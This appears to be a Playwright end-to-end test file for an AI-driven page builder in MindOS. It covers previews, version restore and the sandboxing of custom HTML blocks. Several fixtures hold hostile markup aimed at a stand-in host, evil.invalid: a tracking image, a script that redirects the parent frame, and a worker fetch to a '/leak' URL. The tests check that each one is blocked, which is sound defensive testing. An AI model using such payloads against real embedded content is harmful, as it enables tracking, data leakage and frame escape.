import { test, expect, type Page } from "@playwright/test";
async function openAI(page: Page) {
  await expect
    .poll(
      async () =>
        (await page.getByLabel("描述页面调整").isVisible()) ||
        (await page
          .getByRole("button", { name: "用 AI 调整", exact: true })
          .isVisible()),
    )
    .toBe(true);
  if (!(await page.getByLabel("描述页面调整").isVisible()))
    await page.getByRole("button", { name: "用 AI 调整", exact: true }).click();
}
import { randomUUID } from "node:crypto";
import { pageFixture, chinesePage } from "../helpers/pages-fixture";
test.skip(
  process.env.MINDOS_VIEWS_ISOLATED !== "1",
  "Use isolated Views runner",
);
test("previews, saves, edits live records, and restores layout without rolling data back", async ({
  page,
  request,
}) => {
  const f = await pageFixture(request);
  await chinesePage(page);
  await page.route("**/api/views/v2", async (route) => {
    const body = route.request().postDataJSON();
    if (body?.op === "page.generate")
      return route.fulfill({
        json: {
          rootId: f.rootId,
          spec: f.spec,
          summary: "把人物、下一步和讨论放在一起。",
        },
      });
    return route.continue();
  });
  await page.goto("/studio/pages/new");
  await openAI(page);
  await page
    .getByLabel("描述页面调整")
    .fill("把任务、人物和讨论组织为项目推进台");
  await page.getByRole("button", { name: "生成预览", exact: true }).click();
  await expect(
    page.getByRole("heading", { name: "看看这次调整" }),
  ).toBeVisible();
  expect(
    (await (await request.get("/api/views/v2?op=page.list")).json()).pages.some(
      (p: any) => p.spec.title === f.spec.title,
    ),
  ).toBe(false);
  await page.getByRole("button", { name: "应用调整", exact: true }).click();
  await page.getByRole("button", { name: "保留此页面" }).click();
  await expect(page).toHaveURL(/\/studio\/pages\/page-/);
  const pageId = page.url().split("/").pop()!;
  const task = page.locator('[data-page-block="tasks"]');
  await task
    .getByRole("button", { name: "评审工作台原型", exact: true })
    .click();
  const dialog = page.getByRole("dialog");
  await dialog.getByLabel("任务", { exact: true }).fill("确认原型与下一步");
  await dialog.getByRole("button", { name: "保存", exact: true }).click();
  await expect(dialog).toHaveCount(0);
  await expect
    .poll(
      async () => (await f.read(f.tasks.collection.id)).records[0].fields.title,
    )
    .toBe("确认原型与下一步");
  if (!(await page.getByLabel("页面标题", { exact: true }).isVisible()))
    await page.getByRole("button", { name: "调整页面", exact: true }).click();
  await page.getByLabel("页面标题", { exact: true }).fill("每日推进台");
  await page.getByRole("button", { name: "保存调整", exact: true }).click();
  await expect
    .poll(
      async () =>
        (
          await (
            await request.get("/api/views/v2?op=page.read&pageId=" + pageId)
          ).json()
        ).page.version,
    )
    .toBe(2);
  await page.getByRole("button", { name: "历史", exact: true }).click();
  await page.getByRole("button", { name: "恢复第 1 版" }).click();
  await expect(
    page.getByRole("heading", { name: "项目推进台", exact: true }),
  ).toBeVisible();
  expect((await f.read(f.tasks.collection.id)).records[0].fields.title).toBe(
    "确认原型与下一步",
  );
  await page.reload();
  await expect(
    page.getByRole("heading", { name: "项目推进台", exact: true }),
  ).toBeVisible();
  if (await page.getByLabel("页面标题", { exact: true }).isVisible())
    await page.getByRole("button", { name: "调整页面", exact: true }).click();
  await page.setViewportSize({ width: 1440, height: 1000 });
  await page.screenshot({
    path: "/tmp/mindos-generative-pages-desktop.png",
    animations: "disabled",
  });
  await page.setViewportSize({ width: 375, height: 850 });
  await page.evaluate(() => document.documentElement.classList.add("dark"));
  expect(await page.evaluate(() => document.documentElement.scrollWidth)).toBe(
    375,
  );
  await page.screenshot({
    path: "/tmp/mindos-generative-pages-narrow-dark.png",
    animations: "disabled",
  });
  await page.reload();
  await expect(
    page.getByRole("heading", { name: "项目推进台", exact: true }),
  ).toBeVisible();
});
test("runs custom programs with live data, isolated interactions, and confirmed task writes", async ({
  page,
  request,
}) => {
  const f = await pageFixture(request);
  await chinesePage(page);
  const html = `<style>button{padding:12px;border-radius:8px}article{padding:12px}</style><article>正在组织资料</article><img src="https://evil.invalid/tracker"><a href="https://evil.invalid/escape">外部链接</a><script>parent.location='https://evil.invalid/escape'</script><script type="mindos/page">const n=(state.n||0)+(event?.id==='count'?1:0);const r=data.records[0];render('<article><h2>'+r.fields.title+'</h2><p>任务状态 '+r.fields.status+'</p><p>已调整 '+n+' 次</p><button id="count">调整一下</button><button data-mindos-action="task.complete" data-record-id="'+r.id+'">完成任务</button></article>',{n});</script>`;
  const saved = await f.post("page.save", {
    expectedVersion: 0,
    operationId: randomUUID(),
    spec: {
      ...f.spec,
      blocks: [
        {
          id: "custom",
          kind: "html",
          title: "专属推进卡",
          collectionId: f.tasks.collection.id,
          fields: ["title", "status"],
          html,
        },
      ],
    },
  });
  const requests: string[] = [];
  page.on("request", (r) => {
    if (r.url().includes("evil.invalid")) requests.push(r.url());
  });
  await page.goto("/studio/pages/" + saved.page.id);
  await page.route("**/api/views/v2", async (route) => {
    if (route.request().postDataJSON()?.op === "page.generate")
      return route.fulfill({
        json: { rootId: f.rootId, spec: saved.page.spec },
      });
    return route.continue();
  });
  const frame = page.frameLocator('iframe[title="专属推进卡"]');
  await expect(
    frame.getByRole("heading", { name: "评审工作台原型" }),
  ).toBeVisible();
  await expect(frame.getByRole("button", { name: "调整一下" })).toHaveCSS(
    "padding-top",
    "12px",
  );
  await frame.getByRole("button", { name: "调整一下" }).click();
  await expect(frame.getByText("已调整 1 次")).toBeVisible();
  await openAI(page);
  await page.getByLabel("描述页面调整").fill("预览这个推进卡");
  await page.getByRole("button", { name: "生成预览", exact: true }).click();
  await expect(
    page.getByRole("heading", { name: "看看这次调整" }),
  ).toBeVisible();
  await frame.getByRole("button", { name: "完成任务" }).click();
  await expect(page.getByRole("button", { name: "确认完成" })).toHaveCount(0);
  expect((await f.read(f.tasks.collection.id)).records[0].fields.status).toBe(
    "todo",
  );
  await page.getByRole("button", { name: "保持原样", exact: true }).click();
  await frame.getByRole("button", {name:"调整一下"}).click();
  await expect(frame.getByText("已调整 1 次", {exact:true})).toBeVisible();
  await frame.getByRole("button", { name: "完成任务" }).click();
  expect((await f.read(f.tasks.collection.id)).records[0].fields.status).toBe(
    "todo",
  );
  await page.getByRole("button", { name: "确认完成" }).click();
  await expect
    .poll(
      async () =>
        (await f.read(f.tasks.collection.id)).records[0].fields.status,
    )
    .toBe("done");
  await expect(frame.getByText("任务状态 done", {exact:true})).toBeVisible();
  await expect(frame.getByText("已调整 1 次", {exact:true})).toBeVisible();
  expect(requests).toEqual([]);
  await page.screenshot({
    path: "/tmp/mindos-generative-page-custom.png",
    animations: "disabled",
  });
});
test("keeps the page usable after a custom program timeout and AI failure", async ({
  page,
  request,
}) => {
  const f = await pageFixture(request);
  await chinesePage(page);
  const saved = await f.post("page.save", {
    expectedVersion: 0,
    operationId: randomUUID(),
    spec: {
      ...f.spec,
      blocks: [
        {
          id: "loop",
          kind: "html",
          title: "超时模块",
          html: '<p>静态资料仍在</p><script type="mindos/page">while(true){}</script>',
        },
      ],
    },
  });
  await page.goto("/studio/pages/" + saved.page.id);
  const frame = page.frameLocator('iframe[title="超时模块"]');
  await expect(frame.getByText("静态资料仍在")).toBeVisible();
  await expect(frame.locator("#runtime-status")).not.toBeEmpty({
    timeout: 10000,
  });
  await page.route("**/api/views/v2", async (route) => {
    if (route.request().postDataJSON()?.op === "page.generate")
      return route.fulfill({
        status: 503,
        json: { error: "AI_NOT_CONFIGURED", message: "请先配置 AI" },
      });
    return route.continue();
  });
  await openAI(page);
  await page.getByLabel("描述页面调整").fill("让页面简洁一些");
  await page.getByRole("button", { name: "生成预览", exact: true }).click();
  await expect(page.getByRole("link", { name: "打开设置" })).toBeVisible();
  await expect(page.getByLabel("描述页面调整")).toHaveValue("让页面简洁一些");
  await expect(
    page.getByRole("heading", { name: "项目推进台", exact: true }),
  ).toBeVisible();
});

test("blocks worker network access and removes external navigation from custom markup", async ({
  page,
  request,
}) => {
  const f = await pageFixture(request);
  await chinesePage(page);
  const saved = await f.post("page.save", {
    expectedVersion: 0,
    operationId: randomUUID(),
    spec: {
      ...f.spec,
      blocks: [
        {
          id: "network",
          kind: "html",
          title: "隔离网页",
          html: '<script type="mindos/page">try{await fetch("https://evil.invalid/leak");render("NETWORK ALLOWED")}catch{render(\'<p>联网已阻止</p><a href="https://evil.invalid/nav">外部入口</a><img src="https://evil.invalid/image">\')}</script>',
        },
      ],
    },
  });
  const urls: string[] = [];
  page.on("request", (r) => {
    if (r.url().includes("evil.invalid")) urls.push(r.url());
  });
  await page.goto("/studio/pages/" + saved.page.id);
  const frame = page.frameLocator('iframe[title="隔离网页"]');
  await expect(frame.getByText("联网已阻止")).toBeVisible();
  await expect(frame.locator("a")).not.toHaveAttribute("href");
  await frame.getByText("外部入口").click();
  expect(page.url()).toContain("/studio/pages/" + saved.page.id);
  expect(urls).toEqual([]);
});
